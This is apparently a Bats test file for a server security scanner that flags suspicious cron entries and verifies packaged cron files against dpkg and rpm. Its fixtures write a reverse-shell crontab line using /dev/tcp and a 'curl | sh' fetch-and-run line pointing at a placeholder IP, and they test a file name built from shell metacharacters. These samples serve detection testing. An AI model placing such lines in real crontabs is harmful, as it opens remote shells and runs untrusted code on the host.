#!/usr/bin/env bats
# Per-user crontabs are read from cron_spool_dir, so a cronie host (RHEL,
# Arch: /var/spool/cron/<user>) is scanned and counted like a Debian one.

load helpers.bash

setup() {
    _vpssec_load core/distro.sh
    i18n_load en_US
    # shellcheck source=/dev/null
    source "$(_vpssec_repo_root)/modules/filesystem.sh"
    # shellcheck source=/dev/null
    source "$(_vpssec_repo_root)/modules/scheduling.sh"

    SPOOL_DIR="$BATS_TEST_TMPDIR/spool/cron"
    mkdir -p "$SPOOL_DIR"
    cron_spool_dir() { printf '%s\n' "$SPOOL_DIR"; }
}

@test "cron spool: each family names its own spool directory" {
    unset -f cron_spool_dir
    # shellcheck source=/dev/null
    source "$(_vpssec_repo_root)/core/distro.sh"
    VPSSEC_DISTRO_FAMILY=debian run cron_spool_dir
    [ "$output" = "/var/spool/cron/crontabs" ]
    VPSSEC_DISTRO_FAMILY=rhel run cron_spool_dir
    [ "$output" = "/var/spool/cron" ]
    VPSSEC_DISTRO_FAMILY=arch run cron_spool_dir
    [ "$output" = "/var/spool/cron" ]
}

@test "cron spool: user crontabs are counted from the spool directory" {
    printf '* * * * * true\n' > "$SPOOL_DIR/root"
    printf '* * * * * true\n' > "$SPOOL_DIR/deploy"
    run _fs_count_user_crontabs
    [ "$output" = "2" ]
}

@test "cron spool: a suspicious user crontab entry is reported with its owner" {
    printf '* * * * * bash -i >& /dev/tcp/203.0.113.9/4444 0>&1\n' > "$SPOOL_DIR/deploy"
    run _fs_find_suspicious_cron
    [[ "$output" == *"User deploy crontab: matches"* ]]
}

@test "cron spool: the scheduling inventory reads the same spool directory" {
    printf '# header\n*/5 * * * * curl -s http://203.0.113.9/x | sh\n' > "$SPOOL_DIR/deploy"
    run _sched_find_internet_fetch_in_cron
    [[ "$output" == *"$SPOOL_DIR/deploy:2"* ]]
    # A location, never the entry: cron lines carry tokens.
    [[ "$output" != *"203.0.113.9"* ]]
}

@test "cron spool: a commented-out fetch is not reported" {
    printf '# */5 * * * * curl -s http://203.0.113.9/x | sh\n' > "$SPOOL_DIR/deploy"
    run _sched_find_internet_fetch_in_cron
    [ "$status" -eq 0 ]
    [[ "$output" != *"$SPOOL_DIR/deploy"* ]]
}

@test "cron spool: a file name that is not valid sed still has its entries read" {
    # Same loop as /etc/cron.d, where cronie runs a file named a|b. A name spliced
    # into a sed program made sed fail and the file's entries, and the finding, vanish.
    printf '*/5 * * * * curl -s http://203.0.113.9/x | sh\n' > "$SPOOL_DIR/a|b&c\\d"
    run _sched_find_internet_fetch_in_cron
    [ "$output" = "$SPOOL_DIR/a|b&c\\d:1" ]
}

@test "cron spool: a fetch is matched in the entry, not in the file name" {
    printf '* * * * * echo hi | sh\n' > "$SPOOL_DIR/curl-checker"
    run _sched_find_internet_fetch_in_cron
    [ "$status" -eq 0 ]
    [ -z "$output" ]
}

# ---- system cron files: comments and unmodified packaged files -------------

# A scratch /etc/crontab and cron.d, with dpkg answering for them.
_system_cron() {
    FS_CRONTAB="$BATS_TEST_TMPDIR/crontab"
    FS_CRON_DIRS=("$BATS_TEST_TMPDIR/cron.d")
    mkdir -p "${FS_CRON_DIRS[0]}"
    : > "$FS_CRONTAB"
    VPSSEC_PKG_MGR=apt
}

# Debian's certbot entry, which wraps its renewal in `perl -e 'sleep …'`.
_certbot_cron() {
    printf '%s\n' '# /etc/cron.d/certbot: crontab entries for the certbot package' \
        "0 */12 * * * root test -x /usr/bin/certbot -a \\! -d /run/systemd/system && perl -e 'sleep int(rand(43200))' && certbot -q renew" \
        > "${FS_CRON_DIRS[0]}/certbot"
}

# dpkg owning every path it is asked about for package certbot, whose Conffiles
# field records md5 $1 for file $2; md5sums, as in a real package, leaves
# conffiles out. An empty $1 records no sum at all.
_dpkg_owns() {
    local real
    real=$(readlink -f "$2")
    _vpssec_stub_script dpkg-query <<SH
case "\$1" in
    -S) echo "certbot: \$3" ;;
    --control-show) echo "0123456789abcdef0123456789abcdef  usr/bin/certbot" ;;
    -W) [[ -n "$1" ]] && echo " $real $1" ;;
esac
exit 0
SH
}

@test "cron: a pattern in a comment line is not a finding" {
    _system_cron
    printf '# debug: perl -e "print 1"\n17 * * * * true\n' > "$SPOOL_DIR/deploy"
    printf '# curl http://x | sh\n17 * * * * root true\n' > "$FS_CRONTAB"
    _vpssec_stub dpkg-query 1

    run _fs_find_suspicious_cron
    [ -z "$output" ]
    printf '17 * * * * perl -e "print 1"\n' > "$SPOOL_DIR/deploy"
    run _fs_find_suspicious_cron
    [[ "$output" == *"User deploy crontab: matches"* ]]
}

@test "cron: a packaged cron file its package still verifies is not a finding" {
    # cron.d files are conffiles: their sum is in Conffiles, not md5sums.
    _system_cron
    _certbot_cron
    local f="${FS_CRON_DIRS[0]}/certbot" sum
    sum=$(md5sum < "$f")
    _dpkg_owns "${sum%% *}" "$f"

    run _fs_find_suspicious_cron
    [ "$status" -eq 0 ]
    [ -z "$output" ]
}

@test "cron: a packaged cron file whose content was changed is a finding" {
    _system_cron
    _certbot_cron
    _dpkg_owns ffffffffffffffffffffffffffffffff "${FS_CRON_DIRS[0]}/certbot"

    run _fs_find_suspicious_cron
    [[ "$output" == *"${FS_CRON_DIRS[0]}/certbot"*"perl.*-e"* ]]
}

@test "cron: a packaged file with no recorded sum is not vouched for" {
    # dpkg --verify says nothing about a file it holds no sum for; silence
    # there is not "unchanged".
    _system_cron
    _certbot_cron
    _dpkg_owns "" "${FS_CRON_DIRS[0]}/certbot"

    run _fs_find_suspicious_cron
    [[ "$output" == *"${FS_CRON_DIRS[0]}/certbot"* ]]
}

@test "cron: a cron file no package owns is a finding" {
    _system_cron
    _certbot_cron
    _vpssec_stub dpkg-query 1

    run _fs_find_suspicious_cron
    [[ "$output" == *"${FS_CRON_DIRS[0]}/certbot"* ]]
}

@test "cron: on a dnf host rpm answers who owns the file and whether it changed" {
    _system_cron
    _certbot_cron
    VPSSEC_PKG_MGR=dnf
    local f="${FS_CRON_DIRS[0]}/certbot"
    _vpssec_stub rpm 1
    run _fs_find_suspicious_cron
    [[ "$output" == *"$f"* ]]

    _vpssec_stub rpm 0 ""
    run _fs_find_suspicious_cron
    [ -z "$output" ]

    _vpssec_stub_script rpm <<SH
[[ "\$1" == -Vf ]] && { echo "S.5....T.  c $f"; exit 1; }
exit 0
SH
    run _fs_find_suspicious_cron
    [[ "$output" == *"$f"* ]]
}
